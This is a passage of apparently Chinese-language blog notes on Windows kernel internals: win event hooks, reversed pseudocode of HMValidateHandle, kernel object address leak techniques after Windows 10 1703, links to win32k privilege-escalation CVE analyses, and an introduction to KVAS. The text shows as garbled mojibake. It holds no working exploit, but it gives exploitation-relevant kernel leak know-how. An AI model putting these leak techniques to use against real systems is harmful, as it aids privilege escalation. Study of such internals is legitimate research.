<td>è¡¨ç¤ºæˆªè·å“ªä¸ªèŒƒå›´ç±»çš„äº‹ä»¶ã€‚å¾®è½¯ç»™æ¯ä¸ªäº‹ä»¶å®šä¹‰äº†ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/winauto/event-constants?redirectedfrom=MSDN">ç¼–å·</a>ï¼Œè¿™äº›äº‹ä»¶éƒ½æ˜¯ä»¥ <code>EVENT_</code> å¼€å¤´ï¼ˆæ¶ˆæ¯ä»¥<code>WM_</code>å¼€å¤´ï¼‰ã€‚æœ‰ä¸¤ä¸ªå®åˆ†åˆ«è¡¨ç¤ºæœ€å°çš„äº‹ä»¶IDå’Œæœ€å¤§çš„äº‹ä»¶IDï¼ˆ<code>EVENT_MIN</code> å’Œ <code>EVENT_MAX</code>ï¼‰ï¼Œåˆ†åˆ«ä¼ è¿™ä¸¤ä¸ªå‚æ•°ç»™<em>eventMinå’ŒeventMax</em>åˆ™å¯ä»¥æˆªè·æ‰€æœ‰çš„äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>dwFlags</td>
<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwineventhook">è¯¥æ ‡å¿—ç”¨æ¥è¯´æ˜</a>ï¼ŒåŒ…å«é’©å­çš„ DLL æ˜¯å¦å·²ç»åŠ è½½åˆ°ç›®æ ‡è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚</td>
</tr>
<tr>
<td>idProcess</td>
<td>é’©å­å‡½æ•°æ¥æ”¶å“ªä¸ªè¿›ç¨‹ PID çš„äº‹ä»¶ï¼Œå¦‚æœä¸º <code>0</code> åˆ™æ¥æ”¶å½“å‰æ¡Œé¢ä¸Šæ‰€æœ‰è¿›ç¨‹çš„äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>idThread</td>
<td>é’©å­å‡½æ•°æ¥æ”¶å“ªä¸ªçº¿ç¨‹ TID çš„äº‹ä»¶ï¼Œå¦‚æœä¸º <code>0</code> åˆ™æ¥æ”¶å½“å‰æ¡Œé¢ä¸Šæ‰€æœ‰çº¿ç¨‹çš„äº‹ä»¶ã€‚</td>
</tr>
<tr>
<td>offPfn</td>
<td>åç§»å€¼ï¼ˆRVAï¼‰ï¼Œé’©å­å‡½æ•°ç›¸å¯¹äºæ³¨å…¥ DLL åŸºåœ°å€çš„åç§»ã€‚</td>
</tr>
<tr>
<td>ihmod</td>
<td><code>win32k!aatomsysLoaded</code> æ•°ç»„çš„ç´¢å¼•ï¼Œå¯ç”¨äºæ ‡è¯†åŒ…å«æŒ‚é’©è¿‡ç¨‹çš„ DLL çš„å®Œæ•´è·¯å¾„ã€‚</td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nc-winuser-wineventproc?redirectedfrom=MSDN">é’©å­å‡½æ•°</a>åŸå‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">( CALLBACK *WINEVENTPROC)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  Â HWINEVENTHOOK hWinEventHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  Â DWORD Â Â Â Â Â Â Â Â event,</span></span></span><br><span class="line"><span class="function"><span class="params">  Â HWND Â Â Â Â Â Â Â Â Â hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">  Â LONG Â Â Â Â Â Â Â Â Â idObject,</span></span></span><br><span class="line"><span class="function"><span class="params">  Â LONG Â Â Â Â Â Â Â Â Â idChild,</span></span></span><br><span class="line"><span class="function"><span class="params">  Â DWORD Â Â Â Â Â Â Â Â dwEventThread,</span></span></span><br><span class="line"><span class="function"><span class="params">  Â DWORD Â Â Â Â Â Â Â Â dwmsEventTime</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwinevent">é’©å­å¸è½½</a>å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookWinEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HWINEVENTHOOK hWinEventHook</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-notifywinevent">ç”Ÿæˆäº‹ä»¶</a>çš„å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NotifyWinEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD event,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HWND  hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] LONG  idObject,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] LONG  idChild</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="2-GUI-Windows-10ä»¥åçš„å˜åŒ–"><a href="#2-GUI-Windows-10ä»¥åçš„å˜åŒ–" class="headerlink" title="2 GUI-Windows 10ä»¥åçš„å˜åŒ–"></a>2 GUI-Windows 10ä»¥åçš„å˜åŒ–</h2><p><strong>Windows 10 1703â€”â€”å–æ¶ˆå¯¹è±¡å¤´ phead</strong></p>
<p>è¯¥ç‰ˆæœ¬ä»¥å‰ï¼Œå¯ä»¥ä½¿ç”¨ <code>user32!gSharedInfo.aheList</code>ï¼ˆ<code>_HANDLEENTRY</code>ï¼‰å¾—åˆ°å¥æŸ„è¡¨ï¼Œç„¶åä½¿ç”¨ <code>HANDLEENTRY.phead.Hanle</code> å¾—åˆ°ç”¨æˆ·å¯¹è±¡å¥æŸ„ï¼Œè°ƒç”¨ <code>PVOID HMValidateHandle(HANDLE Handle, HANDLE_TYPE hType)</code> å¾—åˆ°è¯¥å¯¹è±¡çš„åœ°å€ã€‚ï¼ˆæ­¤å¤„çš„ <code>HANDLE</code> ä¸æ˜¯ <code>ntoskrnl</code> ä¸­çš„å¥æŸ„ï¼‰</p>
<p>ä½†æ˜¯ï¼Œä» <strong>Windows 10 1703</strong> å¼€å§‹ï¼Œ<mark class="label danger">å¾®è½¯å–æ¶ˆäº†pheadæŒ‡é’ˆ</mark>ï¼Œå µæ­»äº†æ³„æ¼ã€‚</p>
<p>ä½†æ˜¯ï¼Œä»ç„¶å¯ä»¥ä»ç”¨æˆ·æ¨¡å¼çš„<strong>æ¡Œé¢å †</strong>æˆ– <code>TEB.Win32ClientInfo</code> æ¥æ³„éœ²çª—å£å¯¹è±¡â€”â€”ã€Š<a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials/expDev/22.html">Part 18: Kernel Exploitation -&gt; RS2 Bitmap Necromancy</a>ã€‹ã€‚</p>
<p>GUI æ¼æ´èšç„¦äºï¼š<strong>å†…æ ¸æ•°æ®æ³„æ¼</strong>ã€‚</p>
<p>ä¸¤ç¯‡å†™çš„éå¸¸å¥½çš„æ–‡ç« ä¸€å®šè¦æ‹œè¯»ï¼š</p>
<ol>
<li>ã€Š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h3-12">CVE-2021-1732 Windows10 æœ¬åœ°ææƒæ¼æ´å¤ç°åŠè¯¦ç»†åˆ†æ</a>ã€‹</li>
<li>ã€Š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272305">CVE-2022-21882 Win32kå†…æ ¸ææƒæ¼æ´æ·±å…¥åˆ†æ</a>ã€‹</li>
</ol>
<p>CVE-2022-21882æ˜¯å¯¹CVE-2021-1732æ¼æ´çš„ç»•è¿‡ï¼Œå±äºwin32ké©±åŠ¨ç¨‹åºä¸­çš„ä¸€ä¸ªç±»å‹æ··æ·†æ¼æ´ã€‚</p>
<p><strong>CVE-2021-1732</strong>ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h3-12">CVE-2021-1732 Windows10 æœ¬åœ°ææƒæ¼æ´å¤ç°åŠè¯¦ç»†åˆ†æ</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-274015.htm">CVE-2021-1732ææƒæ¼æ´å­¦ä¹ ç¬”è®°</a></li>
<li><a target="_blank" rel="noopener" href="https://www.real-sec.com/2022/01/technical-analysis-of-cve-2021-1732/">Technical Analysis of CVE-2021-1732</a>â€”â€”ç¿»è¯‘ç‰ˆæœ¬<a target="_blank" rel="noopener" href="https://nosec.org/home/detail/4940.html">æ·±å…¥åˆ†æCVE-2021-1732æ¼æ´</a></li>
<li><a target="_blank" rel="noopener" href="https://iamelli0t.github.io/2021/03/25/CVE-2021-1732.html">CVE-2021-1732: win32kfull xxxCreateWindowEx callback out-of-bounds</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261767.htm">é«˜ç‰ˆæœ¬64ä½Win10ï¼ˆRS2æˆ–æ›´é«˜ï¼‰ä¸‹æšä¸¾æ¶ˆæ¯é’©å­çš„ä¸€ç§æ€è·¯</a></li>
</ul>
<p><strong>CVE-2022-21882</strong>ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272305">CVE-2022-21882 Win32kå†…æ ¸ææƒæ¼æ´æ·±å…¥åˆ†æ</a></li>
<li><a target="_blank" rel="noopener" href="https://www.avira.com/en/blog/anatomy-of-an-exploit-in-windows-win32k-cve-2022-21882">Anatomy of an exploit in Windows win32k â€“ CVE-2022-21882</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261767.htm">é«˜ç‰ˆæœ¬64ä½Win10ï¼ˆRS2æˆ–æ›´é«˜ï¼‰ä¸‹æšä¸¾æ¶ˆæ¯é’©å­çš„ä¸€ç§æ€è·¯</a></li>
</ul>
<p>CVE-2018-8453ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-5.html">ä»è¡¥ä¸diffåˆ°EXPâ€“CVE-2018-8453æ¼æ´åˆ†æä¸åˆ©ç”¨</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-249021.htm">cve-2018-8453åˆ†æåŠåˆ©ç”¨EXPç¼–å†™</a></li>
</ul>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p>æ–‡ç«  <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261767.htm">é«˜ç‰ˆæœ¬64ä½Win10ï¼ˆRS2æˆ–æ›´é«˜ï¼‰ä¸‹æšä¸¾æ¶ˆæ¯é’©å­çš„ä¸€ç§æ€è·¯</a> ç»™å‡ºäº†Windows 10 å‡½æ•°å¤šç§æ–°çš„å˜åŒ–ï¼Œè¿˜æœ‰ <code>win32kbase!HMValidateHandle</code> å‡½æ•°ã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-251220.htm">Win10 tagWnd &amp; å†…æ ¸æšä¸¾çª—å£</a>ã€‚åœ¨ 3 ç¯è·å–æ–¹å¼å‚çœ‹<a target="_blank" rel="noopener" href="https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp">è¿™é‡Œ</a>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">HANDLE_TYPE</span> &#123;</span></span><br><span class="line">       TYPE_FREE = <span class="number">0</span>,</span><br><span class="line">       TYPE_WINDOW = <span class="number">1</span>,</span><br><span class="line">       TYPE_MENU = <span class="number">2</span>,</span><br><span class="line">       TYPE_CURSOR = <span class="number">3</span>,</span><br><span class="line">       TYPE_SETWINDOWPOS = <span class="number">4</span>,</span><br><span class="line">       TYPE_HOOK = <span class="number">5</span>,</span><br><span class="line">       TYPE_CLIPDATA = <span class="number">6</span>,</span><br><span class="line">       TYPE_CALLPROC = <span class="number">7</span>,</span><br><span class="line">       TYPE_ACCELTABLE = <span class="number">8</span>,</span><br><span class="line">       TYPE_DDEACCESS = <span class="number">9</span>,</span><br><span class="line">       TYPE_DDECONV = <span class="number">10</span>,</span><br><span class="line">       TYPE_DDEXACT = <span class="number">11</span>,</span><br><span class="line">       TYPE_MONITOR = <span class="number">12</span>,</span><br><span class="line">       TYPE_KBDLAYOUT = <span class="number">13</span>,</span><br><span class="line">       TYPE_KBDFILE = <span class="number">14</span>,</span><br><span class="line">       TYPE_WINEVENTHOOK = <span class="number">15</span>,</span><br><span class="line">       TYPE_TIMER = <span class="number">16</span>,</span><br><span class="line">       TYPE_INPUTCONTEXT = <span class="number">17</span>,</span><br><span class="line">       TYPE_HIDDATA = <span class="number">18</span>,</span><br><span class="line">       TYPE_DEVICEINFO = <span class="number">19</span>,</span><br><span class="line">       TYPE_TOUCHINPUT = <span class="number">20</span>,</span><br><span class="line">       TYPE_GESTUREINFO = <span class="number">21</span>,</span><br><span class="line">       TYPE_CTYPES = <span class="number">22</span>,</span><br><span class="line">       TYPE_GENERIC = <span class="number">255</span></span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="function">PVOID <span class="title">HMValidateHandle</span><span class="params">(HANDLE Handle, HANDLE_TYPE hType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       PVOID Object = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span> ((USHORT)Handle &lt; gSharedInfo-&gt;psi-&gt;cHandleEntries)</span><br><span class="line">       &#123;</span><br><span class="line">              PHANDLEENTRY hEntry = &amp;gSharedInfo-&gt;aheList[(USHORT)Handle];</span><br><span class="line">              PVOID *pObject = &amp;gpKernelHandleTable[<span class="number">2</span> * (USHORT)Handle];</span><br><span class="line">              USHORT Handle_HIWORD = (USHORT)(Handle &gt;&gt; <span class="number">0x10</span>);</span><br><span class="line">              <span class="keyword">if</span> ((Handle_HIWORD == hEntry-&gt;wUniq || Handle_HIWORD == <span class="number">-1</span> || !Handle_HIWORD &amp;&amp; PsGetCurrentProcessWow64Process())</span><br><span class="line">                     &amp;&amp; !(hEntry-&gt;bFlags &amp; <span class="number">1</span>)</span><br><span class="line">                     &amp;&amp; hEntry-&gt;bType == hType )</span><br><span class="line">              &#123;</span><br><span class="line">                     Object = *pObject;</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (W32GetThreadWin32Thread(PsGetCurrentThread())-&gt;TIF_flags &amp; <span class="number">0x20000000</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (!ValidateHandleSecure(Handle, <span class="number">3</span>)) Object = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (!ValidateHandleSecure(Handle, <span class="number">2</span>)) Object = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (!Object)</span><br><span class="line">       &#123;</span><br><span class="line">              DWORD dwErrorCode;</span><br><span class="line">              <span class="keyword">switch</span> (hType)</span><br><span class="line">              &#123;</span><br><span class="line">              <span class="keyword">case</span> TYPE_WINDOW:</span><br><span class="line">                     dwErrorCode = <span class="number">1400</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_MENU:</span><br><span class="line">                     dwErrorCode = <span class="number">1401</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_CURSOR:</span><br><span class="line">                     dwErrorCode = <span class="number">1402</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_SETWINDOWPOS:</span><br><span class="line">                     dwErrorCode = <span class="number">1405</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_HOOK:</span><br><span class="line">                     dwErrorCode = <span class="number">1404</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_ACCELTABLE:</span><br><span class="line">                     dwErrorCode = <span class="number">1403</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">default</span>:</span><br><span class="line">                     dwErrorCode = <span class="number">6</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              UserSetLastError(dwErrorCode);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> Object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> ä»ä¼ªä»£ç æ¥çœ‹ï¼Œä¼¼ä¹åªéœ€è¦éå†gSharedInfo-&gt;aheListå¹¶å–å‡ºHANDLEENTRY.bTypeä¸ºTYPE_HOOKçš„ç´¢å¼•ï¼Œå³å¯ä»gpKernelHandleTableä¸­æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„tagHOOKã€‚</p>
<p>  ä½†æ˜¯ï¼Œåœ¨15063ä»¥ä¸Šçš„ç‰ˆæœ¬çš„Win10ä¸­ï¼ŒgpKernelHandleTableæ£€ç´¢æ–¹æ³•å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚ï¼š15063ä¸‹tagHOOKObject&#x3D;gpKernelHandleTable[2 * Index]ï¼›18362ä¸‹åˆ™å˜æˆäº†tagHOOKObject&#x3D;gpKernelHandleTable[3 * Index]ã€‚</p>
<p>  å‡ºäºå…¼å®¹æ€§çš„è€ƒè™‘ï¼Œç¬”è€…å†³å®šé€šè¿‡wUniqæ¥ç”Ÿæˆé’©å­çš„å¥æŸ„hHOOK &#x3D; Index | (gSharedInfo-&gt;aheList[Index].wUniq &lt;&lt; 0x10)ï¼Œå¹¶è°ƒç”¨HmValidateHandleæ¥è·å–tagHOOKã€‚è™½ç„¶win32kbase.sysä¸‹HmValidateHandleæ²¡æœ‰å¯¼å‡ºä¸”æ²¡æœ‰å¯¼å‡ºå‡½æ•°è°ƒç”¨å®ƒï¼Œä½†win32kfull.sysé‡Œä¹Ÿæœ‰ä¸å…¶åŠŸèƒ½ç›¸åŒçš„HmValidateHandleï¼Œè€Œä¸”ç¬”è€…å‘ç°user32!UnhookWindowsHookExçš„åº•å±‚è°ƒç”¨win32kfull!NtUserUnhookWindowsHookExä¸­å‡ºç°äº†å¯¹HmValidateHandleçš„è°ƒç”¨.</p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h2 id="3-åˆæ­¥äº†è§£KVAS"><a href="#3-åˆæ­¥äº†è§£KVAS" class="headerlink" title="3 åˆæ­¥äº†è§£KVAS"></a>3 åˆæ­¥äº†è§£KVAS</h2><h3 id="ä»€ä¹ˆæ˜¯KVAS"><a href="#ä»€ä¹ˆæ˜¯KVAS" class="headerlink" title="ä»€ä¹ˆæ˜¯KVAS"></a>ä»€ä¹ˆæ˜¯KVAS</h3><p>å†…æ ¸è™šæ‹Ÿåœ°å€å½±å­ï¼ˆKernel Virtual Address Shadowï¼Œç”±å¾®è½¯æå‡ºçš„ä¸€ä¸ªæœ¯è¯­ï¼Œç®€ç§°KVASï¼‰ï¼Œç±»ä¼¼äºLinuxä¸Šçš„KPTIï¼ˆKernel page-table isolationï¼‰å†…æ ¸é¡µè¡¨éš”ç¦»æœºåˆ¶ï¼Œå³æŠŠè¿›ç¨‹é¡µè¡¨æŒ‰ç…§æˆç”¨æˆ·æ€ã€å†…æ ¸æ€ç‹¬ç«‹çš„åˆ†å‰²æˆä¸¤ä»½ï¼Œä¸ºäº†æœç»ç”¨æˆ·æ€é€šè¿‡ä¸€äº›æ—è·¯æ¼æ´æ¥çªƒå–å†…æ ¸æ€çš„æ•°æ®ã€‚KVASåœ¨Windows10&#x2F;11ä¸Šæ˜¯é»˜è®¤å¼€å¯çš„ã€‚</p>
<p>å¦‚æœå¼€å¯KVASçš„è¯ï¼Œåº”ç”¨ç¨‹åºä¼šæœ‰ä¸¤ä¸ªCR3ï¼Œå³æœ‰PCB.DirectoryTableBaseå’ŒPCB.UserDirectoryTableBaseä¸¤ä¸ªåŸŸã€‚å…¶ä¸­DirectoryTableBaseåŸŸå¯ä»¥ç†è§£ä¸ºå†…æ ¸CR3ï¼Œèƒ½å¤Ÿè®¿é—®å†…æ ¸ç‰©ç†é¡µï¼Œè€Œä¸‰ç¯çš„Cr3ï¼ˆUserDirectoryTableBaseï¼‰åªæ˜ å°„äº†å†…æ ¸çš„KVASCODEåŒºæ®µçš„ç‰©ç†é¡µï¼ˆå°‘æ•°r3è¿›å…¥r0çš„å…¥å£ï¼‰ï¼Œè€Œæ²¡æœ‰æ˜ å°„å…¶ä»–åŒºæ®µçš„ï¼Œå› æ­¤é€šè¿‡3ç¯çš„Cr3å¯»æ‰¾å†…æ ¸TEXTæ®µçš„ç‰©ç†é¡µï¼Œæœ€å¤šåªèƒ½æ‰¾åˆ°PPEï¼Œè€Œä»PDEå¼€å§‹å°±æ²¡æœ‰æ˜ å°„äº†ã€‚</p>
<h3 id="åˆ†æKVASåˆå§‹åŒ–è¿‡ç¨‹"><a href="#åˆ†æKVASåˆå§‹åŒ–è¿‡ç¨‹" class="headerlink" title="åˆ†æKVASåˆå§‹åŒ–è¿‡ç¨‹"></a>åˆ†æKVASåˆå§‹åŒ–è¿‡ç¨‹</h3><p>åˆ†æKVASçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œå¯ä»¥è¿½æº¯åˆ°æ“ä½œç³»ç»Ÿåˆå§‹åŒ–å‡½æ•° <em>KiSystemStartupï¼ˆWindowsæ“ä½œå¯åŠ¨å…¥å£ç‚¹ï¼Œç”±æ“ä½œç³»ç»ŸåŠ è½½å™¨ï¼ˆOS Loaderï¼‰è°ƒç”¨ï¼‰</em>ï¼Œ å…¶ä¸­è°ƒç”¨äº†KilnitializeBootStructuresï¼Œä¼šåˆå§‹åŒ–æ“ä½œç³»ç»Ÿæ‰€éœ€çš„ä¸€äº›ç»“æ„ï¼Œå…¶ä¸­å°±ä¼šé€šè¿‡PRCBåˆ¤æ–­æ˜¯å¦åˆå§‹åŒ–KVASè€Œè°ƒç”¨KiEnableKvaShadowingï¼Œå¹¶è®¾ç½® <em>KiKvaShadow &#x3D; 1</em>ï¼Œå¹¶éšåé…ç½®ç³»ç»Ÿè°ƒç”¨å¤„ç†å™¨ä¸ºKiSystemCall32Shadow&#x2F;KiSystemCall64Shadowï¼Œè€Œè‹¥æ²¡æœ‰å¼€å¯KVASåˆ™å‘ç”Ÿç³»ç»Ÿè°ƒç”¨æ—¶è°ƒç”¨çš„å¤„ç†å™¨æ˜¯KiSystemCall32&#x2F;KiSystemCall64ã€‚</p>
<p><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiEnableKvaShadowing.jpg" alt="KiEnableKvaShadowing"></p>
<p>ä¹Ÿå°±æ˜¯å½“å¼€å¯KVASåsyscallå‘ç”Ÿæ—¶ä¼šèµ°KiSystemCall64Shadowäº¤æ¢é¡µè¡¨</p>
<p><img data-src="http://www.qfrost.com/images/WindowsKernel/%E5%86%85%E5%AD%98%E9%9A%90%E8%97%8F/KiSystemCall64Shadow.png" alt="KiSystemCall64Shadow"></p>
<p>PSï¼šå®é™…ä¸Šï¼Œä¸ä»…æ˜¯ç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼Œå¾ˆå¤šä¸­æ–­å¤„ç†ä¾‹ç¨‹ï¼ˆå¦‚KiBreakPointTrapç­‰ï¼‰ï¼Œä¹Ÿæœ‰shadowç‰ˆæœ¬</p>
<h3 id="dual-CR3"><a href="#dual-CR3" class="headerlink" title="dual CR3"></a>dual CR3</h3><p>å…ˆè¯´ç»“è®ºï¼š<strong>åœ¨Windows10ä¸‹å½“ç‰¹æƒçº§èº«ä»½è¿è¡Œç¨‹åºçš„æ—¶å€™ï¼Œä¸ä¼šå‡ºç°dual CR3æƒ…å†µï¼Œåªæœ‰ä¸€ä¸ªCR3ï¼ˆåªæœ‰PCB.DirectoryTableBaseï¼ŒPCB.UserDirectoryTableBaseä¸ºç©ºï¼‰</strong></p>
